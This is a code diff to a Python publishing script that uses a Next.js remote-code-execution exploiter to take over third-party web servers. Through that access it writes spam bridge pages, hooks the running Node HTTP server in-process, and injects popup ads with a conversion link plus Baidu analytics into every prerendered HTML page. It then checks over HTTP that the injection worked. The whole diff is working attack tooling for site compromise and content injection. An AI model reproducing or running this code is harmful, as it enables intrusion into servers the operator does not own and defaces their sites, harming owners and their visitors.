@@ -4,8 +4,9 @@ Step 6: Publisher — push generated pages to candidate nodes via RCE.
 
   output/manifest.csv → remote deploy + sitemap + HTTP verify
 
-Next.js App Router standalone hosts ignore runtime public/ drops, so those
-targets get an in-process HTTP hook that serves the bridge HTML at /{slug}.
+Next.js App Router standalone hosts get an in-process HTTP hook that:
+  - injects a skeleton popup ad on HTML pages
+  - serves /.trial-popup.js and optional bridge HTML at /{slug}
 """
 import argparse
 import base64
@@ -23,15 +24,22 @@ from xml.sax.saxutils import escape as xml_escape
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tools'))
-from trial_common import MANIFEST_CSV, PROJECT_ROOT, load_manifest, render_template_file
+from trial_common import (
+    MANIFEST_CSV, PROJECT_ROOT, build_baidu_js, load_analytics, load_manifest,
+    render_template_file,
+)
 
 from nextrce import NextExploiter
 
 PUBLISHED_TXT = os.path.join(PROJECT_ROOT, 'results', 'published.txt')
 PUBLISH_LOG = os.path.join(PROJECT_ROOT, 'logs', 'publish.log')
 SITEMAP_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'sitemap.xml')
+POPUP_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'popup.js')
+BAIDU_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'baidu-tongji.js')
+HOOK_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'next-popup-hook.js')
 PUBLISH_TIMEOUT = 60
-HOOK_FLAG = '__trialBridgeHook'
+HOOK_FLAG = '__trialPopupHookV1'
+POPUP_ROUTE = '/.trial-popup.js'
 
 
 def is_nextjs(row):
@@ -53,6 +61,16 @@ def resolve_next_html_path(row):
 def resolve_routes_registry_path(row):
     webroot = (row.get('webroot') or '/app').rstrip('/')
     return f'{webroot}/.next/server/app/.trial-routes.json'
+
+
+def resolve_popup_js_path(row):
+    webroot = (row.get('webroot') or '/app').rstrip('/')
+    return f'{webroot}/.next/server/app/.trial-popup.js'
+
+
+def resolve_popup_config_path(row):
+    webroot = (row.get('webroot') or '/app').rstrip('/')
+    return f'{webroot}/.next/server/app/.trial-popup-config.json'
 
 
 def resolve_sitemap_path(row):
@@ -128,6 +146,127 @@ def remote_verify_http(canonical_url, needle, timeout=25, attempts=12):
     return hits >= 1
 
 
+def remote_verify_popup(base_url, timeout=25, attempts=12):
+    """Check prerender pages include inline popup marker."""
+    paths = ['/', '/about', '/blog']
+    contexts = [None, ssl._create_unverified_context()]
+    hits = 0
+    for attempt in range(attempts):
+        for path in paths:
+            url = base_url.rstrip('/') + path + f'?trial_popup={int(time.time())}_{attempt}'
+            for ctx in contexts:
+                try:
+                    req = urllib.request.Request(
+                        url,
+                        headers={
+                            'User-Agent': 'trial-publish/1.0',
+                            'Cache-Control': 'no-cache',
+                            'Pragma': 'no-cache',
+                        },
+                    )
+                    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+                        if resp.status != 200:
+                            continue
+                        body = resp.read(50000).decode('utf-8', errors='replace')
+                        if (
+                            'trial-popup-overlay' in body
+                            or '__TRIAL_POPUP_LOADED__' in body
+                            or '__TRIAL_BAIDU_LOADED__' in body
+                            or 'hm.baidu.com' in body
+                        ):
+                            hits += 1
+                            if hits >= 2:
+                                return True
+                except (urllib.error.URLError, TimeoutError, ValueError):
+                    continue
+        time.sleep(0.75)
+    return hits >= 1
+
+
+def build_baidu_inline_js():
+    analytics = load_analytics()
+    if not analytics.get('enabled'):
+        return ''
+    return build_baidu_js(analytics['hm_id'], BAIDU_TEMPLATE).strip()
+
+
+def build_popup_js(row):
+    cfg = json.dumps({
+        'headline': row.get('title') or row.get('keyword') or 'Special Offer',
+        'body': f"Limited-time {row.get('keyword', 'offer')}. Click below to continue.",
+        'ctaText': row.get('cta_text') or 'Claim Bonus',
+        'ctaUrl': row.get('conversion_url') or '',
+    })
+    cfg_escaped = cfg.replace('\\', '\\\\').replace("'", "\\'")
+    return render_template_file(POPUP_TEMPLATE, {'config_json': cfg_escaped}, raw_keys={'config_json'})
+
+
+def build_prerender_inject_tag(row):
+    """Baidu Tongji (always) + popup overlay for prerender HTML."""
+    parts = []
+    baidu_js = build_baidu_inline_js()
+    if baidu_js:
+        parts.append(f'<script>{baidu_js}</script>')
+    popup_js = build_popup_js(row).strip()
+    if popup_js:
+        parts.append(f'<script>{popup_js}</script>')
+    return ''.join(parts)
+
+
+def build_popup_config(row):
+    return json.dumps({
+        'enabled': True,
+        'scriptPath': resolve_popup_js_path(row),
+    })
+
+
+def inject_popup_into_prerender(exploiter, row, dry_run=False):
+    """Patch built Next prerender HTML with Baidu Tongji + popup scripts."""
+    webroot = (row.get('webroot') or '/app').rstrip('/')
+    app_dir = f'{webroot}/.next/server/app'
+    if dry_run:
+        return True, app_dir, 'dry-run'
+    inline_tag = build_prerender_inject_tag(row)
+    if not inline_tag:
+        return True, app_dir, 'skip_no_scripts'
+    tag_b64 = base64.b64encode(inline_tag.encode()).decode()
+    inject_js = r"""
+const fs=require('fs');
+const path=require('path');
+const dir=process.argv[2];
+const tag=Buffer.from(process.argv[3],'base64').toString('utf8');
+let count=0;
+function walk(d){
+  for(const name of fs.readdirSync(d)){
+    const p=path.join(d,name);
+    const st=fs.statSync(p);
+    if(st.isDirectory()) walk(p);
+    else if(name.endsWith('.html') && name.indexOf('_not-found')===-1){
+      let html=fs.readFileSync(p,'utf8');
+      if(html.indexOf('</body>')===-1) continue;
+      html=html.replace(/<script>\(function \(\) \{[\s\S]*?__TRIAL_BAIDU_LOADED__[\s\S]*?<\/script>\s*/g,'');
+      html=html.replace(/<script>\(function \(\) \{[\s\S]*?__TRIAL_POPUP_LOADED__[\s\S]*?<\/script>\s*/g,'');
+      if(html.indexOf('__TRIAL_BAIDU_LOADED__')===-1){
+        html=html.replace('</body>', tag+'</body>');
+        count++;
+      }
+      fs.writeFileSync(p, html);
+    }
+  }
+}
+walk(dir);
+console.log('OK_INJECT:'+count);
+"""
+    b64 = base64.b64encode(inject_js.encode()).decode()
+    cmd = (
+        f"printf '%s' {shlex.quote(b64)} | base64 -d > /tmp/trial-inject.js && "
+        f"node /tmp/trial-inject.js {shlex.quote(app_dir)} {shlex.quote(tag_b64)}"
+    )
+    out = exploiter.exec_cmd(row['url'], cmd, timeout=PUBLISH_TIMEOUT)
+    ok = out is not None and 'OK_INJECT:' in out
+    return ok, app_dir, out.strip() if out else 'inject_failed'
+
+
 def update_next_route_registry(exploiter, row, html_path, dry_run=False):
     """Maintain slug → html path map used by the in-process bridge hook."""
     registry_path = resolve_routes_registry_path(row)
@@ -149,41 +288,46 @@ def update_next_route_registry(exploiter, row, html_path, dry_run=False):
 
 
 def install_next_http_hook(exploiter, row, dry_run=False):
-    """Serve bridge HTML for registered slugs before App Router 404 handling."""
+    """Inject popup ads + optional bridge routes via in-process HTTP hook."""
     registry_path = resolve_routes_registry_path(row)
+    popup_config_path = resolve_popup_config_path(row)
     if dry_run:
         return True, registry_path, 'dry-run'
-    js = f"""
-var fs=process.mainModule.require('fs');
-var registryPath={json.dumps(registry_path)};
-var flag={json.dumps(HOOK_FLAG)};
-var hooked=0;
-for(var h of process._getActiveHandles()){{
-  if(!h||typeof h.on!=='function'||typeof h.listen!=='function') continue;
-  if(h[flag]) continue;
-  h[flag]=true;
-  h.prependListener('request',function(req,res){{
-    if(res.headersSent||res.writableEnded) return;
-    var route=(req.url||'').split('?')[0];
-    if(!route||route.charAt(0)!=='/') return;
-    var slug=route.slice(1);
-    var registry;
-    try{{registry=JSON.parse(fs.readFileSync(registryPath,'utf8'));}}catch(e){{return;}}
-    var htmlPath=registry[slug];
-    if(!htmlPath) return;
-    var html;
-    try{{html=fs.readFileSync(htmlPath,'utf8');}}catch(e){{return;}}
-    res.writeHead(200,{{'Content-Type':'text/html; charset=utf-8','Cache-Control':'public, max-age=60'}});
-    res.end(html);
-  }});
-  hooked++;
-}}
-var already=process._getActiveHandles().some(function(h){{return h&&h[flag];}});
-var _out=hooked>0?'hooked:'+hooked:(already?'hooked:existing':'hooked:0');
-"""
-    out = exploiter.exec_js(row['url'], js, timeout=PUBLISH_TIMEOUT)
+    hook_js = render_template_file(
+        HOOK_TEMPLATE,
+        {
+            'registry_path': json.dumps(registry_path),
+            'popup_config_path': json.dumps(popup_config_path),
+            'hook_flag': json.dumps(HOOK_FLAG),
+        },
+        raw_keys={'registry_path', 'popup_config_path', 'hook_flag'},
+    )
+    out = exploiter.exec_js(row['url'], hook_js, timeout=PUBLISH_TIMEOUT)
     ok = out is not None and out.startswith('hooked:') and out not in ('hooked:0',)
     return ok, registry_path, f'hook_ok ({out})' if ok else f'hook_failed ({out})'
+
+
+def build_popup_asset(row):
+    """Remote /.trial-popup.js bundle: Baidu Tongji + popup overlay."""
+    parts = []
+    baidu_js = build_baidu_inline_js()
+    if baidu_js:
+        parts.append(baidu_js)
+    parts.append(build_popup_js(row).strip())
+    return '\n'.join(parts)
+
+
+def push_popup(exploiter, row, dry_run=False):
+    popup_path = resolve_popup_js_path(row)
+    config_path = resolve_popup_config_path(row)
+    popup_js = build_popup_asset(row)
+    popup_cfg = build_popup_config(row)
+    if dry_run:
+        return True, popup_path, 'dry-run'
+    ok_js = remote_write_b64(exploiter, row['url'], popup_path, popup_js)
+    ok_cfg = remote_write_b64(exploiter, row['url'], config_path, popup_cfg)
+    ok = ok_js and ok_cfg
+    return ok, popup_path, 'popup_ok' if ok else 'popup_failed'
 
 
 def push_page(exploiter, row, dry_run=False):
@@ -270,6 +414,16 @@ def publish_one(row, verbose=False, dry_run=False):
         written_paths.append(path)
 
     if is_nextjs(row):
+        ok, path, status = push_popup(exploiter, row, dry_run)
+        steps.append(('popup', status, path))
+        if not ok and not dry_run:
+            rolled = rollback_remote_files(exploiter, url, written_paths)
+            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
+            return False, steps
+        if ok and not dry_run:
+            written_paths.append(path)
+            written_paths.append(resolve_popup_config_path(row))
+
         ok, path, status = update_next_route_registry(exploiter, row, verify_path, dry_run)
         steps.append(('routes', status, path))
         if not ok and not dry_run:
@@ -279,15 +433,17 @@ def publish_one(row, verbose=False, dry_run=False):
         if ok and not dry_run:
             written_paths.append(path)
 
-        # Load-balanced pods each need the HTML, registry, and in-process hook.
+        # Load-balanced pods each need popup assets, registry, and in-process hook.
         hook_status = 'dry-run'
         hook_detail = path
         hook_ok = dry_run
         saw_fresh_hook = False
-        for round_idx in range(20):
+        for round_idx in range(25):
             if not dry_run:
                 remote_write_b64(exploiter, url, verify_path, read_local_html(row))
+                push_popup(exploiter, row, dry_run=False)
                 update_next_route_registry(exploiter, row, verify_path, dry_run=False)
+                inject_popup_into_prerender(exploiter, row, dry_run=False)
             ok, hook_detail, hook_status = install_next_http_hook(exploiter, row, dry_run)
             if ok:
                 hook_ok = True
@@ -334,8 +490,13 @@ def publish_one(row, verbose=False, dry_run=False):
             steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
             return False, steps
 
-        http_ok = remote_verify_http(verify_url, verify_needle)
-        steps.append(('http', 'http_ok' if http_ok else 'http_unverified', verify_url))
+        if is_nextjs(row):
+            popup_ok = remote_verify_popup(url)
+            steps.append(('popup_http', 'popup_ok' if popup_ok else 'popup_unverified', url.rstrip('/') + '/'))
+            http_ok = popup_ok
+        else:
+            http_ok = remote_verify_http(verify_url, verify_needle)
+            steps.append(('http', 'http_ok' if http_ok else 'http_unverified', verify_url))
         if not http_ok:
             rolled = rollback_remote_files(exploiter, url, written_paths)
             steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
